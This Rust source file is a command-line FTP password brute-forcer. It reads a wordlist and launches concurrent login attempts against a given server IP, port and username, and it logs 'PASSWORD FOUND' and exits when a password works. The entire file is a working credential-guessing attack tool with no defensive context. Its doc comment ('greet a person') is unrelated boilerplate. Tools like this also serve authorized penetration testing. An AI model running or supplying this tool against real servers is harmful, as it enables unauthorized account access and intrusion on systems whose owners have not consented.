use clap::Parser;
use ftp::FtpStream;
use log::{error, info};
use simple_logger;
use std::sync::{Arc, Mutex};

use std::{
    fs::File,
    io::{self, BufRead},
};

/// Simple program to greet a person
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// ftp user
    #[arg(short, long)]
    u: String,

    /// wordlist path
    #[arg(short, long)]
    w: String,

    /// server ip
    #[arg(short, long)]
    ip: String,

    /// port server
    #[arg(short, long)]
    p: String,

    #[arg(short, long, default_value_t = 1)]
    count: u32,
}

#[tokio::main]
async fn main() {
    simple_logger::init().unwrap();

    let args = Args::parse();

    let words = read_file(&args.w)
        .await
        .expect("ERROR: Error opening wordlist file");

    let shared_words = Arc::new(Mutex::new(words));

    let mut handles: Vec<tokio::task::JoinHandle<()>> = vec![];

    let total_requests = shared_words.lock().unwrap().len();
    for i in 0..total_requests {
        let shared_words = Arc::clone(&shared_words);
        let word = shared_words.lock().unwrap()[i].clone();
        let args = Args::parse();
        let handle = tokio::task::spawn(async move {
            match ftp_connect(&args.ip, &args.p, &args.u, &word).await {
                Ok(_) => {
                    info!("[+] SUCCESS: {}", &word);
                    info!("PASSWORD FOUND: ---{}---", &word);
                    std::process::exit(0);
                }

                Err(_) => {
                    error!("[-] FAILED: {}", &word);
                }
            }
        });
        handles.push(handle);
    }
    for handle in handles {
        handle.await.expect("Error: waiting for task to complete");
    }
}

async fn read_file(file_path: &str) -> io::Result<Vec<String>> {
    let file = File::open(file_path)?;
    let reader = io::BufReader::new(file);
    Ok(reader.lines().filter_map(|line| line.ok()).collect())
}

async fn ftp_connect(
    ip: &str,
    port: &str,
    username: &str,
    password: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut ftp_stream = FtpStream::connect(&format!("{}:{}", &ip, &port))
        .expect("ERROR: Could not connect to server");
    let _ = ftp_stream.login(&username, &password)?;
    let _ = ftp_stream.quit();
    Ok(())
}
